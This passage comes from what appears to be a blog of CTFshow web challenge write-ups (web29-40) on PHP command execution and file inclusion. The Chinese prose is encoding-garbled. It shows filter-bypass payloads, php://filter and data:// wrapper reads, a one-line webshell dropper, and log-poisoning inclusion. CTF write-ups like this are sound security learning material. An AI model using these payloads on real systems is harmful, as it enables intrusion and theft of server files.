invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·‘ä¸€ä¸‹å‰©ä½™å­—ç¬¦ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680166455656-158b002d-4a51-46d1-a26e-4f05df0a938a.png" alt="image.png"><br>é¢˜ç›®çš„æ„æ€å°±æ˜¯è®©æˆ‘ä»¬ä½¿ç”¨å‰©ä½™çš„è¿™äº›å­—ç¬¦å‡‘å‡ºä¸€ä¸ª36å‡ºæ¥ã€‚æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹payloadæ˜¯ä»€ä¹ˆï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨linuxä¸­å°è¯•ä¸€ä¸‹ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680166804307-4e25e785-2fda-487e-9e77-1a53dc2711aa.png" alt="image.png"><br>ä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢ï¼Ÿæˆ‘ä»¬åˆ†æä¸€ä¸‹ï¼Œæˆ‘ä»¬å…ˆè¦çŸ¥é“è¿™å…¶ä¸­çš„å‡ ä¸ªåŸºç¡€ç»“æ„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;_&#125;:ä»£è¡¨ä¸Šä¸€æ¬¡å‘½ä»¤æ‰§è¡Œçš„ç»“æœ</span><br><span class="line">$(()): åšè¿ç®—</span><br></pre></td></tr></table></figure><p>çŸ¥é“äº†åŸºç¡€ï¼Œç„¶åæˆ‘ä»¬ç»“åˆæ•°æ®ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(($&#123;_&#125;))=<span class="number">0</span></span><br><span class="line">$((~$(($&#123;_&#125;))))=-<span class="number">1</span></span><br></pre></td></tr></table></figure><p>ç„¶åç›´æ¥ä½¿ç”¨è„šæœ¬è·‘å°±è¡Œï¼Œéœ€è¦36ï¼Œé‚£ä¹ˆå°±ä¼ å…¥37ç„¶åå†å‡ä¸€å°±è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">&quot;$((~$((&quot;</span>+<span class="string">&quot;$((~$(())))&quot;</span>*<span class="number">37</span>+<span class="string">&quot;))))&quot;</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web29-41å‘½ä»¤æ‰§è¡Œç¯‡ï¼ˆä¸€ï¼‰</title>
      <link href="/2023/03/15/web29-41%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/03/15/web29-41%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆç®€å•çš„ä¸€é“é¢˜ã€‚<code>?c=system(&quot;ls&quot;);</code>æŸ¥çœ‹ä¸€ä¸‹å‘ç°flag.phpå°±åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œå› ä¸ºè¿‡æ»¤äº†flagå­—èŠ‚ï¼Œæ‰€ä»¥ç›´æ¥ç”¨f*ä»£æ›¿å°±è¡Œ<br>payloadï¼š<code>?c=system(&quot;cat f*&quot;);</code><br>flagåœ¨æºä»£ç ä¸­ã€‚</p><h2 id="å…¶ä»–è§£æ³•"><a href="#å…¶ä»–è§£æ³•" class="headerlink" title="å…¶ä»–è§£æ³•"></a>å…¶ä»–è§£æ³•</h2><ul><li>é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ–‡ä»¶å¤åˆ¶ä¸€ä»½ä¿®æ”¹ä¸ºå…¶ä»–åå­—ã€‚</li></ul><p>payloadï¼š<code>?c=system(&quot;cp f* a.txt&quot;);</code><br>ç„¶åç›´æ¥è®¿é—®æˆ–è€…catè®¿é—®éƒ½å¯ä»¥è·å¾—flagã€‚</p><ul><li><p>æˆ–è€…ä½¿ç”¨<code>tac</code>ä»åå¾€å‰è¾“å‡ºå†…å®¹<br><code>c=system(&quot;tac f*&quot;);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678683262006-674f9d23-a923-4232-b54e-03a16b60eacc.png" alt="image.png"></p></li><li><p>é™¤äº†ä½¿ç”¨systemå‡½æ•°æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å†…æ•›æ‰§è¡Œï¼š<code>echo </code>å‘½ä»¤<code> æ¯”å¦‚`c=echo `tac f*</code></p></li><li><p>çœ‹äº†wpå‘ç°è¿˜æœ‰å‡ ç§è§£æ³•æ¯”å¦‚ï¼šåˆ©ç”¨å‚æ•°è¾“å…¥+eval/include</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls%20/&quot;</span>);</span><br><span class="line"></span><br><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure></li><li><p>æˆ–è€…ä¸Šä¼ æœ¨é©¬ï¼š<code>file_put_contents(&quot;alb34t.php&quot;,%20%27&lt;?php%20eval($_POST[&quot;cmd&quot;]);%20?&gt;%27);</code></p></li><li><p>hintä¸­ä½¿ç”¨äº†å¦ä¸€ç§å‘½ä»¤å’Œç»•è¿‡ï¼š<code>nl fl&#39;&#39;ag.php</code></p><h2 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><p>catæ‰“å¼€åphpæ–‡ä»¶ä¸ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œå› æ­¤éœ€è¦f12æŸ¥çœ‹æºä»£ç ã€‚</p></li></ul><h1 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>uploadï¼š<code>?c=echo </code>tac f*<code>;</code></p><h1 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç©ºæ ¼è¿‡æ»¤å¸¸ç”¨ä»¥ä¸‹æ–¹æ³•ç»•è¿‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$<span class="number">9</span>flag.txt <span class="comment">//9æ”¹æˆå…¶ä»–æ•°å­—ä¹Ÿè¡Œ</span></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat%<span class="number">09</span>flag.txt</span><br><span class="line">cat%<span class="number">20</span>flag.txt <span class="comment">//è¿™ä¸ªè¿™é‡Œå¥½åƒä¸è¡Œ</span></span><br></pre></td></tr></table></figure><p>payloadï¼š<code>?c=echo%09</code>tac%09f*<code>;</code></p><h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>uploadï¼š<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678685067177-79d4d744-a673-436a-ac56-1be9a06a0803.png" alt="image.png"></p><h2 id="å…¶ä»–æ–¹æ³•"><a href="#å…¶ä»–æ–¹æ³•" class="headerlink" title="å…¶ä»–æ–¹æ³•"></a>å…¶ä»–æ–¹æ³•</h2><blockquote><p><a href="https://ctf.show/writeups/865962">https://ctf.show/writeups/865962</a></p></blockquote><p>åˆæ¬¡ä¹‹å¤–ï¼Œwpä¸­è¿˜æœ‰ä¸€ç§åœ¨logä¸­æ³¨å…¥æœ¨é©¬çš„æ–¹å¼ã€‚åœ¨User-Agent<br>ä¸­å†™å…¥æœ¨é©¬<code>&lt;?php phpinfo();?&gt;</code>ï¼Œåœ¨cä¸­ä¼ å…¥èƒ½æ­£å¸¸è®¿é—®çš„å€¼ï¼Œæˆ‘ä»¬æ ¹æ®è¯·æ±‚å¤´å¯ä»¥åˆ¤æ–­å‡ºæ˜¯nginxæœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨çš„é»˜è®¤æ—¥å¿—åœ°å€ä¸ºï¼š<code>/var/log/nginx/access.log </code>ï¼Œå†åŠ ä¸Šè¿™é‡Œçš„includeçš„å­—æ®µï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä»¥ä¸‹payloadï¼š<code>?c=include$_GET[a]?%3E&amp;a=../../../../var/log/nginx/access.log</code>ï¼Œæ—¥å¿—é¡µé¢ä¸­å‡ºç°phpinfo()é¡µé¢ï¼Œæ’å…¥æœ¨é©¬æˆåŠŸã€‚</p><h1 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>uploadï¼š<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h1 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>uploadï¼š<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h1 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>uploadï¼š<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h1 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†æ•°å­—ï¼ŒæŠŠ1æ”¹ä¸ºaå°±èƒ½æ¥ç€ç”¨ã€‚<br>uploadï¼š<code>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h1 id="web37-dataä¼ªåè®®æ–‡ä»¶åbase64"><a href="#web37-dataä¼ªåè®®æ–‡ä»¶åbase64" class="headerlink" title="web37 dataä¼ªåè®®æ–‡ä»¶åbase64"></a>web37 dataä¼ªåè®®æ–‡ä»¶åbase64</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å›ç›´æ¥ç»™ä½ includeï¼Œæ–‡ä»¶åŒ…å«ï¼Œä¸è®©å‡ºç°flagå­—æ®µï¼Œä¸Šæ¥å…ˆæƒ³åˆ°dataä¼ªåè®®ã€‚<br>uploadï¼š<code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs+</code><br>å…¶ä¸­<code>PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs+</code>æ˜¯ï¼š<code>&lt;?php system(&quot;tac flag.php&quot;);&gt;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678719387328-7c2f4056-1b4c-4999-9290-945a41c4ce13.png" alt="image.png"></p><h2 id="å¤ä¹ ä¸€ä¸‹dataä¼ªåè®®çš„ç”¨æ³•ï¼š"><a href="#å¤ä¹ ä¸€ä¸‹dataä¼ªåè®®çš„ç”¨æ³•ï¼š" class="headerlink" title="å¤ä¹ ä¸€ä¸‹dataä¼ªåè®®çš„ç”¨æ³•ï¼š"></a>å¤ä¹ ä¸€ä¸‹dataä¼ªåè®®çš„ç”¨æ³•ï¼š</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€data:<span class="comment">//text/plain,</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>ã€data:<span class="comment">//text/plain;base64,</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br></pre></td></tr></table></figure><h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­ä½¿ç”¨ä¸Šä¸€é¢˜uploadå³å¯ï¼š<code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs+</code></p><h1 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>uploadï¼š<code>?c=data://text/plain,&lt;?php system(&quot;tac f*&quot;);?&gt;//</code><br>é¢˜ç›®åœ¨includeåé¢å¼ºåŠ äº†<code>.php</code>æˆ‘ä»¬åªéœ€è¦åœ¨è¯­å¥ä¸­æ·»åŠ <code>//</code>æ³¨é‡Šæ‰æœ«å°¾çš„å­—æ®µå³å¯ã€‚<br>ä½†äº‹å®ä¸Šï¼Œè¿™é“é¢˜ä¸ç”¨ç®¡ä¹Ÿå¯ä»¥ï¼Œå»æ‰<code>//</code>ä¹Ÿæ˜¯æ²¡é—®é¢˜çš„ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678720477364-6e7e2ec6-9a53-45d0-9550-05fa59a7a617.png" alt="image.png"></p><h1 id="web40-ç¦æ­¢å¥—å¨ƒï¼ˆæœ‰Â·ä¸œè¥¿ï¼‰"><a href="#web40-ç¦æ­¢å¥—å¨ƒï¼ˆæœ‰Â·ä¸œè¥¿ï¼‰" class="headerlink" title="web40 ç¦æ­¢å¥—å¨ƒï¼ˆæœ‰Â·ä¸œè¥¿ï¼‰"></a>web40 ç¦æ­¢å¥—å¨ƒï¼ˆæœ‰Â·ä¸œè¥¿ï¼‰</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> 